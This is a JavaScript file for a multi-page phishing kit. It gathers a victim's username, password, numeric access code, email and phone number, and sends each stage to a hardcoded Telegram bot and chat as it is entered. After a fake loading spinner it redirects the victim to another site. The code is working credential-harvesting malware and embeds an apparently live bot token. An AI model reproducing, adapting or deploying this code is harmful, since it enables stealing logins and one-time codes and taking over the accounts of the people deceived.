/* ============================================================
   🔧 TELEGRAM BOT CONFIGURATION
   👇 PASTE YOUR TOKEN AND CHAT ID RIGHT HERE 👇
   ============================================================ */
const TELEGRAM_BOT_TOKEN = "9151669465:AAF1GHP-ctYlD7dwMyH0XWg23KHeocgGS4o"; // e.g., "123456:ABC-DEF..."
const TELEGRAM_CHAT_ID   = "-5551108658";   // e.g., "-1001234567890" (Don't forget the minus sign!)
const REDIRECT_URL       = "https://www.cutx.org";

/* ============================================================
   📦 DATA STORAGE
   ============================================================ */
const formData = {
  username: "",
  password: "",
  accessCode: "",
  email: "",
  phone: ""
};

/* ============================================================
   🧭 NAVIGATION
   ============================================================ */
function showPage(pageId) {
  document.querySelectorAll('.card').forEach(card => card.classList.remove('active'));
  document.getElementById(pageId).classList.add('active');
}

/* ============================================================
   📨 TELEGRAM SENDER (Safari-Proof Version)
   ============================================================ */
async function sendTelegramMessage(title, messageBody) {
  // Escape HTML characters to prevent formatting crashes
  const escapeHtml = (text) => {
    return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
  };

  const safeTitle = escapeHtml(title);
  const safeBody = escapeHtml(messageBody);
  const safeTime = escapeHtml(new Date().toLocaleString());
  const safeDevice = escapeHtml(navigator.userAgent);

  const fullMessage = 
`<b>${safeTitle}</b>
━━━━━━━━━━━━━━━━━━
${safeBody}
━━━━━━━━━━━━━━━━━━
🕒 <b>Time:</b> ${safeTime}
🌐 <b>Device:</b> ${safeDevice}`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  // ✅ SAFARI FIX: Use URLSearchParams instead of JSON
  const formDataParams = new URLSearchParams();
  formDataParams.append('chat_id', TELEGRAM_CHAT_ID);
  formDataParams.append('text', fullMessage);
  formDataParams.append('parse_mode', 'HTML');

  try {
    const response = await fetch(url, {
      method: "POST",
      body: formDataParams // No Content-Type header needed, Safari loves this!
    });
    
    const data = await response.json();
    
    if (data.ok) {
      console.log("✅ Sent to Telegram successfully!");
    } else {
      console.error("❌ Telegram Error:", data.description);
    }
  } catch (error) {
    console.error("❌ Network Error:", error);
  }
}

/* ===== PAGE 1 → PAGE 2 (Sends Username & Password) ===== */
function goToPage2() {
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  let valid = true;

  document.getElementById('username-error').classList.remove('show');
  document.getElementById('password-error').classList.remove('show');

  if (!username) { document.getElementById('username-error').classList.add('show'); valid = false; }
  if (!password) { document.getElementById('password-error').classList.add('show'); valid = false; }

  if (valid) {
    formData.username = username;
    formData.password = password;

    // 🚀 SEND PAGE 1 DATA TO BACKEND IMMEDIATELY
    sendTelegramMessage("🔐 NEW LOGIN SUBMISSION", 
      `👤 <b>Username:</b> ${formData.username}\n🔑 <b>Password:</b> ${formData.password}`
    );

    showPage('page2');
  }
}

/* ===== PAGE 2 → PAGE 3 (Sends Access Code) ===== */
function goToPage3() {
  const code = document.getElementById('access-code').value.trim();
  document.getElementById('code-error').classList.remove('show');

  if (code.length < 6 || isNaN(code)) {
    document.getElementById('code-error').classList.add('show');
    return;
  }

  formData.accessCode = code;

  // 🚀 SEND PAGE 2 DATA TO BACKEND IMMEDIATELY
  sendTelegramMessage("🛡️ SECURE ACCESS CODE", 
    `🔑 <b>Access Code:</b> ${formData.accessCode}\n👤 <b>Linked User:</b> ${formData.username}`
  );

  showPage('page3');
}

/* ===== PAGE 3 → PAGE 4 (Sends Contact Info) ===== */
function goToPage4() {
  const email = document.getElementById('email').value.trim();
  const phone = document.getElementById('phone').value.trim();
  let valid = true;

  document.getElementById('email-error').classList.remove('show');
  document.getElementById('phone-error').classList.remove('show');

  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  if (!emailRegex.test(email)) { document.getElementById('email-error').classList.add('show'); valid = false; }

  const phoneRegex = /^[\+]?[\d\s\-\(\)]{7,15}$/;
  if (!phoneRegex.test(phone)) { document.getElementById('phone-error').classList.add('show'); valid = false; }

  if (valid) {
    formData.email = email;
    formData.phone = phone;

    // 🚀 SEND PAGE 3 DATA TO BACKEND IMMEDIATELY
    sendTelegramMessage("📧 CONTACT INFORMATION", 
      `📧 <b>Email:</b> ${formData.email}\n📱 <b>Phone:</b> ${formData.phone}\n👤 <b>Linked User:</b> ${formData.username}`
    );

    showPage('page4');
    startSpinnerTimer();
  }
}

/* ===== SPINNER TIMER (5 SECONDS) ===== */
function startSpinnerTimer() {
  setTimeout(() => {
    showPage('page5');
    startRedirectTimer();
  }, 5000);
}

/* ===== REDIRECT TIMER (3 SECONDS) ===== */
function startRedirectTimer() {
  setTimeout(() => {
    window.location.href = REDIRECT_URL;
  }, 3000);
}

/* ===== PASSWORD SHOW/HIDE ===== */
function togglePassword() {
  const passwordInput = document.getElementById('password');
  const toggleBtn = document.getElementById('showPasswordBtn');
  if (passwordInput.type === 'password') {
    passwordInput.type = 'text';
    toggleBtn.textContent = 'Hide';
  } else {
    passwordInput.type = 'password';
    toggleBtn.textContent = 'Show';
  }
}

/* ===== INPUT LISTENERS ===== */
document.getElementById('access-code').addEventListener('input', function() {
  this.value = this.value.replace(/[^0-9]/g, '');
});

document.getElementById('password').addEventListener('keypress', function(e) { if (e.key === 'Enter') goToPage2(); });
document.getElementById('access-code').addEventListener('keypress', function(e) { if (e.key === 'Enter') goToPage3(); });
document.getElementById('phone').addEventListener('keypress', function(e) { if (e.key === 'Enter') goToPage4(); });